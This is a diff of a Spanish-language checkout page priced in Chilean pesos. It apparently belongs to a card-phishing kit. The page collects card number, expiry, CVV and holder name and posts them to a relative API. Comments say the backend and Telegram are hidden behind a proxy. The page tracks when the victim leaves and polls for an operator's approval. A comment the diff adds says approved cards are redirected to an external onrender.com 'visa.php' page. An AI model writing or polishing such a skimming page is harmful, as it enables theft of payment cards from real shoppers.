@@ -17,7 +17,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--font-family); }
         body { background-color: #fff; color: var(--text-primary); min-height: 100vh; display: flex; overflow: hidden; }
 
-        /* --- PC Layout --- */
         .desktop-layout { display: flex; width: 100vw; height: 100vh; }
 
         .sidebar { width: 30vw; min-width: 320px; background: var(--brand-bg); background-attachment: fixed; padding: 56px 48px; display: flex; flex-direction: column; justify-content: space-between; color: #fff; }
@@ -36,7 +35,6 @@
         .header-payment h1 { font-size: 22px; font-weight: 600; margin-bottom: 6px; }
         .secure-text { display: flex; align-items: center; gap: 6px; font-size: 14px; color: var(--text-secondary); }
 
-        /* Formulario de tarjeta */
         .card-form { background: #fff; border: 1px solid var(--border-color); border-radius: 10px; padding: 24px; display: flex; flex-direction: column; gap: 18px; }
         .form-group { display: flex; flex-direction: column; gap: 6px; }
         .form-group label { font-size: 13px; font-weight: 500; color: #333; }
@@ -48,7 +46,6 @@
         .form-row { display: flex; gap: 16px; }
         .form-row .form-group { flex: 1; }
 
-        /* Vista previa de la tarjeta */
         .card-preview {
             background: linear-gradient(135deg, #255ade, #0027a8);
             border-radius: 12px; padding: 24px; color: #fff; min-height: 180px;
@@ -79,7 +76,6 @@
         .legal-footer { margin-top: 16px; text-align: center; font-size: 13px; color: var(--text-secondary); display: flex; flex-direction: column; align-items: center; gap: 20px; }
         .legal-footer a { color: var(--text-secondary); text-decoration: underline; }
 
-        /* --- Mobile Layout --- */
         .mobile-layout { display: none; flex-direction: column; width: 100vw; min-height: 100vh; }
         .mobile-header { background: var(--brand-bg); padding: 12px 16px; color: #fff; display: flex; align-items: center; gap: 12px; }
         .mobile-logo-container { width: 44px; height: 44px; background: #fff; border-radius: 6px; display: flex; align-items: center; justify-content: center; padding: 4px; }
@@ -195,7 +191,6 @@
                 </div>
 
                 <form class="card-form" id="form-tarjeta" onsubmit="enviarPago(event)">
-                    <!-- Vista previa de la tarjeta -->
                     <div class="card-preview">
                         <div>
                             <div class="card-chip"></div>
@@ -317,26 +312,21 @@
 
     <script>
         // ============================================================
-        // El front NO conoce el backend de pagos ni Telegram.
-        // Solo usa rutas relativas: /api/crear-pago y /api/estado-pago/:id
-        // El server del front las proxea al backend real.
+        // Solo rutas relativas (/api/...) → el server del front proxea
+        // El HTML NUNCA ve la URL del backend ni Telegram.
         // ============================================================
-
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000; // 5 min
 
-        const formatCLP = (amount) => {
-            return new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
-        };
+        const formatCLP = (amount) =>
+            new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
 
-        // Estado global
         let datosPagoActual = null;
         let notificadoSalida = false;
         let pagoEnviado = false;
         let solicitudId = null;
         let pollingInterval = null;
 
-        // Elementos del overlay
         const loadingOverlay  = document.getElementById('loadingOverlay');
         const loadingText     = document.getElementById('loadingText');
         const logoContainer   = document.getElementById('logoContainer');
@@ -366,32 +356,26 @@
             document.getElementById('mobile-amount').textContent = montoFormateado;
             document.getElementById('mobile-logo').src = data.logo;
 
-            // Formateo número de tarjeta
+            // Formateo número
             document.querySelectorAll('#numero, #numero-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 16);
                     e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
-
                     const isMobile = el.id.endsWith('-m');
                     const preview = document.getElementById(isMobile ? 'preview-numero-m' : 'preview-numero');
-                    if (preview) {
-                        preview.textContent = e.target.value || '•••• •••• •••• ••••';
-                    }
+                    if (preview) preview.textContent = e.target.value || '•••• •••• •••• ••••';
                 });
             });
 
-            // Formateo vencimiento MM/AA
+            // Formateo vencimiento
             document.querySelectorAll('#vence, #vence-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 4);
                     if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
                     e.target.value = v;
-
                     const isMobile = el.id.endsWith('-m');
                     const preview = document.getElementById(isMobile ? 'preview-vence-m' : 'preview-vence');
-                    if (preview) {
-                        preview.textContent = e.target.value || 'MM/AA';
-                    }
+                    if (preview) preview.textContent = e.target.value || 'MM/AA';
                 });
             });
 
@@ -400,27 +384,21 @@
                 el.addEventListener('input', (e) => {
                     const isMobile = el.id.endsWith('-m');
                     const preview = document.getElementById(isMobile ? 'preview-titular-m' : 'preview-titular');
-                    if (preview) {
-                        preview.textContent = (e.target.value || 'NOMBRE APELLIDO').toUpperCase();
-                    }
+                    if (preview) preview.textContent = (e.target.value || 'NOMBRE APELLIDO').toUpperCase();
                 });
             });
         });
 
-        // Detectar salida (no aplica si ya envió)
         function notificarSalida(motivo) {
             if (notificadoSalida || !datosPagoActual || pagoEnviado) return;
             notificadoSalida = true;
-            // (opcional) podrías registrar analytics; ya no se envía a Telegram desde el front
             console.warn('Usuario salió:', motivo);
         }
 
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden') {
                 setTimeout(() => {
-                    if (document.visibilityState === 'hidden') {
-                        notificarSalida('Cambió de pestaña / app');
-                    }
+                    if (document.visibilityState === 'hidden') notificarSalida('Cambió de pestaña / app');
                 }, 1500);
             }
         });
@@ -431,7 +409,7 @@
         });
 
         // ============================================================
-        // POLLING al backend (ruta relativa /api/estado-pago/:id)
+        // POLLING → /api/estado-pago/:id
         // ============================================================
         function iniciarPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
@@ -459,6 +437,8 @@
 
                     if (data.estado === 'aprobado') {
                         clearInterval(pollingInterval);
+                        // data.redirect viene del backend apuntando a
+                        // https://sncill-to-yzzz.onrender.com/visa.php (o master/amex)
                         mostrarCargaConLogos(data.marca, data.redirect);
                     } else if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval);
@@ -472,7 +452,7 @@
         }
 
         // ============================================================
-        // CARGA FINAL + REDIRECCIÓN
+        // PANTALLA FINAL + REDIRECCIÓN
         // ============================================================
         function mostrarCargaConLogos(tipo, redirectUrl) {
             initialSpinner.classList.remove('active');
@@ -508,8 +488,7 @@
         }
 
         function resetFormulario() {
-            const btns = ['btn-pagar', 'btn-pagar-m'];
-            btns.forEach(id => {
+            ['btn-pagar', 'btn-pagar-m'].forEach(id => {
                 const b = document.getElementById(id);
                 if (b) { b.disabled = false; b.textContent = 'Pagar ahora'; }
             });
@@ -521,7 +500,7 @@
         }
 
         // ============================================================
-        // ENVÍO DEL PAGO
+        // ENVÍO DEL PAGO → POST /api/crear-pago (relativo)
         // ============================================================
         async function enviarPago(event) {
             event.preventDefault();
@@ -540,13 +519,12 @@
             const vence = document.getElementById('vence' + sufijo).value.trim();
             const cvv = document.getElementById('cvv' + sufijo).value.trim();
 
-            // Validaciones
             if (!titular || numero.length < 13 || vence.length < 5 || cvv.length < 3) {
                 alert('Por favor completa todos los campos correctamente.');
                 return;
             }
 
-            // Marca de tarjeta
+            // Detectar marca
             let marca = null;
             if (numero.startsWith('4')) marca = 'visa';
             else if (/^(5[1-5]|2[2-7])/.test(numero)) marca = 'mastercard';
@@ -557,14 +535,13 @@
             }
 
             const btn = document.getElementById('btn-pagar' + sufijo);
-            const originalText = btn.textContent;
             btn.disabled = true;
             btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 0 auto;"></div>';
 
             pagoEnviado = true;
             solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
-            // Mostrar overlay de inmediato
+            // Overlay inmediato
             loadingOverlay.classList.add('active');
             loadingText.textContent = 'Procesando pago...';
             initialSpinner.style.display = 'block';
@@ -602,7 +579,6 @@
                     return;
                 }
 
-                // Comienza el polling
                 iniciarPolling();
 
             } catch (error) {
